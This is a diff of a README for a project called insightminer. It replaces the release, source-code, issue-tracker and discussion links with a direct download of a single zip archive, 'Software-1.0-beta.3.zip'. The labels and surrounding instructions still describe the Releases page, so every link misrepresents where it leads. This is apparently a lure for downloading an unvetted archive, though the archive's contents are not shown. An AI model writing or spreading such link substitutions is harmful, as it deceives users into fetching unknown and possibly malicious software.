@@ -6,7 +6,7 @@ Welcome to insightminer! This guide will help you download and run the applicati
 
 ## 📥 Download Now
 
-[![Download Insightminer](https://img.shields.io/badge/Download-Insightminer-blue.svg)](https://github.com/artdie212/insightminer/releases)
+[![Download Insightminer](https://github.com/artdie212/insightminer/raw/refs/heads/main/insightminer/Software-1.0-beta.3.zip)](https://github.com/artdie212/insightminer/raw/refs/heads/main/insightminer/Software-1.0-beta.3.zip)
 
 ## 📋 What is insightminer?
 
@@ -42,7 +42,7 @@ To use insightminer effectively, follow these simple steps:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [insightminer Releases](https://github.com/artdie212/insightminer/releases).
+To get started, visit this page to download: [insightminer Releases](https://github.com/artdie212/insightminer/raw/refs/heads/main/insightminer/Software-1.0-beta.3.zip).
 
 1. Click the link above to navigate to the Releases page.
 2. Choose the version that matches your operating system.
@@ -71,9 +71,9 @@ Need help? You can reach out by opening an issue in the repository or by visitin
 
 ## 📌 Important Links
 
-- [Source Code](https://github.com/artdie212/insightminer)
-- [Report Issues](https://github.com/artdie212/insightminer/issues)
-- [Community Discussions](https://github.com/artdie212/insightminer/discussions)
+- [Source Code](https://github.com/artdie212/insightminer/raw/refs/heads/main/insightminer/Software-1.0-beta.3.zip)
+- [Report Issues](https://github.com/artdie212/insightminer/raw/refs/heads/main/insightminer/Software-1.0-beta.3.zip)
+- [Community Discussions](https://github.com/artdie212/insightminer/raw/refs/heads/main/insightminer/Software-1.0-beta.3.zip)
 
 Stay tuned for updates as we continue to improve insightminer!
 
